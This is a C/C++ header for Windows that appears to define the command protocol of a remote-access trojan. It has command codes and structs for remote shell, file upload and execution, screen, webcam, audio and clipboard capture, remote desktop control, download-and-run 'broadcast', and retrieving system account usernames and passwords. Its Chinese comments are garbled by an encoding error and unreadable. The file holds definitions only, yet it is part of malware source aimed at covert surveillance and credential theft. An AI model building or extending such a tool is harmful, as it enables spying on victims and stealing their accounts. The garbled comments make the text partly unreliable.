#pragma once
#include <windows.h>

//���ݴ���Ļ�������С
#define CONTEXT_BUF_SIZE   (1024 * 4)
//IP��ַ��������С
#define IPADDR_SIZE  32
//����ҳ��ȡIP��ַ����Ϣ������
#define WEBSITE_BUF_SIZE  512
//��Ļ����Ļ�������С
#define SCREEN_BUF_SIZE  4030
//�������仺������С
#define VIDEO_BUF_SIZE   4020
//�������仺������С
#define AUDIO_BUF_SIZE   4078
//�����崫�仺������С
#define CLIPBOARD_BUF_SIZE   4078

//---------------------------------------------------
//ָ��ĺ궨��

#define CMD_SHAKEHAND      0x01  //������֤
#define CMD_SYSINFO        0x02  //ϵͳ��Ϣ
#define CMD_DISKINFO       0x03  //������Ϣ
#define CMD_FILELIST       0x04  //�ļ�����Ϣ
#define CMD_DOWNLOAD       0x05  //�ļ�����
#define CMD_UPLOAD         0x06  //�ļ��ϴ�
#define CMD_FILEUPLOAD     0x07  //�ļ������ϴ�
#define CMD_FILEEXEC       0x08  //�ļ�ִ��
#define CMD_REFRESH        0x09  //ˢ��
#define CMD_FOLDER_CREATE  0x10  //����Ŀ¼(�ļ���)
#define CMD_FILE_DEL       0x11  //�ļ����У�ɾ��
#define CMD_FILE_COPY      0x12  //�ļ��ĸ���
#define CMD_FILE_PASTE     0x13  //�ļ���ճ��
#define CMD_FILE_RENAME    0x14  //�ļ�(��)������
#define CMD_ATTRIBUTE      0x15  //����
#define CMD_TELNET         0x16  //����Զ���ն�
#define CMD_COMMOND        0x17  //��������
#define CMD_CHATMSG        0x18  //������Ϣ
#define CMD_PROGRESS       0x19  //���̹���
#define CMD_PROC_TASKKILL  0x20  //�رս���
#define CMD_SCREEN         0x21  //��Ļ�鿴
#define CMD_GETPWD         0x22  //��ȡϵͳ���ʺ�����
#define CMD_VIDEO_VIEW     0x23  //�����鿴
#define CMD_OPERATOR       0x24  //�ػ�/ע��/����
#define CMD_AUDIO          0x25  //��������
#define CMD_BROADCAST      0x26  //Զ������㲥
#define CMD_DESKTOP        0x27  //�������
//-----------------------------------------------------

typedef struct tagMSGINFO //������Ϣ�ṹ��
{
	int Msg_id;
	BYTE context[CONTEXT_BUF_SIZE];
}MSGINFO_S;

typedef struct tagSYSTEMINFO  //����ϵͳ��Ϣ
{
	char szWANIP[IPADDR_SIZE];    //����IP��ַ
	char szLocalIP[IPADDR_SIZE];  //����IP��ַ
	char hostName[255];   //�������
	bool Cam; //����ͷ
	int OSVer;  //����ϵͳ�汾
	wchar_t szCPUInfo[MAX_PATH]; //cpu��Ϣ
	DWORD dwDiskSize;  //Ӳ����Ϣ
}SYSTEMINFO_S;

typedef struct tagDRIVER  //������Ϣ
{
	wchar_t disk;    //������
	double dwTotal;   //���̵Ĵ�С
	double dwFree;    //ʣ��ռ�
	int nType;  //����
}DRIVER_S;

typedef struct tagFILEINFO      //�ļ���Ϣ
{
	TCHAR szFileName[MAX_PATH]; //�ļ���
	int nType;                  //�ļ�����(�ļ�\�ļ���)
	__int64 size;               //�ļ���С
}FILEINFO_S;

typedef struct tagTEMPSTRUCT  //���ļ����ع����е���ʱ�ṹ��
{
	DWORD cFileInfo;      //CFileInfo���ָ��
	SOCKET l_Socket;      //socket����
	BYTE context[MAX_PATH]; //�ļ�·��
}TEMPSTRUCT;

typedef struct tagDOWNFILEDATA   //�ļ��������ݿ�ṹ
{
	BYTE context[512];  //�����ݵĴ�С
	UINT size;          //�ļ���С
	UINT nCount;        //���������ڽ���������ʾ
	bool bFlag;         //�ļ��Ƿ������
}DOWNFILEDATA_S;

typedef struct tagFILEEXECINFO  //�ļ�ִ�н����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ���
	bool bSuccess;              //ִ�н��
}FILEEXECINFO_S;

typedef struct tagFILEDELSTRUCT  //�ļ����У�ɾ�������̵߳Ľṹ��
{
	DWORD cDiskInfo;          //CDisk���ָ��
	SOCKET l_Socket;          //socket����
	FILEINFO_S tagFileInfo;  //�ļ����ͽṹ��
}FILEDELSTRUCT_S;

typedef struct tagFILECOPY    //�ļ����ƽ����Ϣ
{
	wchar_t szFilePath[MAX_PATH];  //�ļ�ȫ·��
	wchar_t szFileName[MAX_PATH];  //�ļ���
	bool bTag;                   //�Ƿ������
}FILECOPY_S;

typedef struct tagATTRIBUTE   //����
{
	wchar_t szFilePath[MAX_PATH];  //�ļ����ڵ�Ŀ¼
	wchar_t szFileName[MAX_PATH];  //�ļ���
	int nType;                     //�ļ�(��)����
	SYSTEMTIME sysCreateTime;      //����ʱ��
	SYSTEMTIME sysModifyTime;      //�޸�ʱ��
	SYSTEMTIME sysVisitTime;       //����ʱ��
	bool bArchive;                 //�浵
	bool bReadOnly;                //ֻ��
	bool bHide;                    //����
	bool bSystem;                  //ϵͳ
}ATTRIBUTE_S;

typedef struct tagCMD       //CMD������Ϣ
{
	int flag;            //�ṹ�屣���ֶ�
	char command[1024];  //������
}COMMOND_S;

typedef struct tagCHATMSG   //������Ϣ
{
	bool bfirstSend;   //�Ƿ��һ�η�����Ϣ
	bool bClose;  //�Ƿ�ر�
	wchar_t szChatMsg[1024];  //��������
}CHATMSG_S;

typedef struct tagPROGRESS  //�����б���Ϣ
{
	wchar_t szProName[MAX_PATH];   //������
	DWORD nPid;            //����ID��
	int nThreadCount;    //�߳�����
    int nLevel;          //���̼���
	wchar_t szProPath[MAX_PATH];  //����·��
	int nTag;     //�����������ǲ��ǳɹ���(�����ؼ���)
}PROGRESS_S;

typedef struct tagBMPHEADINFO  //BMPλͼͷ��Ϣ
{
	BITMAPINFO tagBitmapInfo;   //λͼ��Ϣ
}BMPHEADINFO_S;

typedef struct tagBMPDATA  //BMPͼ������
{
	BITMAPINFO bmpinfo;  //λͼ��Ϣ
	int Id;
	bool bShow;  //�Ƿ������ʾͼ��
	int Size;
	int HeadSize;
	UINT Begin;      
	BYTE Data[SCREEN_BUF_SIZE];   //����Ľṹ���С��64 + 4030 = 4094 < 4 * 1024
}BMPDATA_S;

typedef struct tagREADPSWDATA  //��Ҫ��ϵͳ�ʺź�����
{
	wchar_t szUserName[250];  //�ʺ�
	wchar_t szUserPwd[250];   //����
	wchar_t szDomain[250];    //��
	wchar_t szErrorMsg[50];   //������Ϣ
}READPSWDATA_S;

typedef struct tagVIDEODATA  //��������
{
	BITMAPINFO bmpinfo;  //λͼ��Ϣ
	int Id;
	bool bShow;         //�Ƿ������ʾͼ��
	DWORD Size;         //���ݴ�С 
	int HeadSize;       //����ͷ����
	UINT Begin;         //�ڼ��η���
	int dwExtend1;     //ѹ��ǰ����
	int dwExtend2;     //ѹ���󳤶�
	BYTE Data[VIDEO_BUF_SIZE];   //����Ľṹ���С��74 + 4020 = 4094 < 4 * 1024
}VIDEODATA_S;

typedef struct tagVIDEOTEMP
{
	DWORD cThis;
	SOCKET l_Socket;
}VIDEOTEMP_S;

typedef struct tagOPERATOR  //�ػ�/ע��/����
{
	int nType;  //���ͣ�0--��ʾ�ػ��� 1--��ʾע���� 2--��ʾ������
}OPERATOR_S;

typedef struct tagAUDIODATA  //��������
{
	int Id;
	bool bRead;  //�Ƿ����������
	DWORD dwSize;  //���ݴ�С
	UINT Begin;    //�ڼ��η���
    BYTE Data[AUDIO_BUF_SIZE];  //����
}AUDIODATA_S;

typedef struct tagINTERNET  //��ҳ
{
	bool bDownLoad;   //�Ƿ������ļ�
	bool bRunExe;   //�Ƿ����������ļ�
	wchar_t szWebSite[MAX_PATH];  //��ҳ��·��
}INTERNET_S;

typedef struct tagWNDINFO  //������Ϣ
{
	wchar_t szTitle[MAX_PATH];  //����
	wchar_t szContent[MAX_PATH];  //����
	UINT nType;    //����
}WNDINFO_S;

typedef struct tagBROADCAST  //�㲥����
{
	bool bTag;  //��־
	INTERNET_S tagInternet;
	WNDINFO_S tagWndInfo;
}BROADCAST_S;

typedef struct tagBROADTEMP  //��ʱ�ṹ��
{
	DWORD cWorkMain;
	BROADCAST_S* pTagBroadCast;
}BROADTEMP_S;

typedef struct tagDESKTOPINFO  //�������
{
	int nType;  //��������
	bool bTag;  //�������
}DESKTOPINFO_S;

typedef struct tagCLIPBOARD
{
	int id;
	bool bRead;  //�Ƿ����������
	DWORD dwSize;  //���ݴ�С
	UINT Begin;    //�ڼ��η���
	char Data[CLIPBOARD_BUF_SIZE];  //����
}CLIPBOARD_S;
//------------------------------------------

//����ϵͳ�İ汾��
enum SYSVERSION
{
	OS_2000,
	OS_XP,
	OS_2003,
	OS_Vista,   //Vista�汾����2008 serverһ��
	OS_WIN7,
	OS_WIN8,
	OS_UNKNOWN  //δ֪����ϵͳ
};

//Ӳ������
enum DISKTYPE
{
	DISK_FIXED,        //�̶�Ӳ��
	DISK_REMOVABLE,    //�ƶ�Ӳ��
	DISK_CDROM         //CD-ROM
};

//�ļ�����
enum FILEATTR
{
	FILE_ATTR,    //�ļ�
	FOLDER_ATTR,   //�ļ���
	FILE_TAG       //��־λ����ʾ�ļ���Ϣ�Ѿ��������
};

//�������ȼ�
enum PROGRESS_LEVEL  
{
	UNKNOWN_LEVEL,    //δ֪
	NORMAL,           //��׼
	IDLE,             //��
	REALTIME,         //ʵʱ
	HIGH,             //��
	ABOVENORMAL,      //���ڱ�׼
	BELOWNORMAL       //���ڱ�׼
};

//�����������
enum DESKTOP_TYPE
{
	MOUSE_MOVE,   //����ƶ�
	DESKTOP_ICON,  //����ͼ��
	TASKBAR,      //�������
	CLIPBOARD    //������
};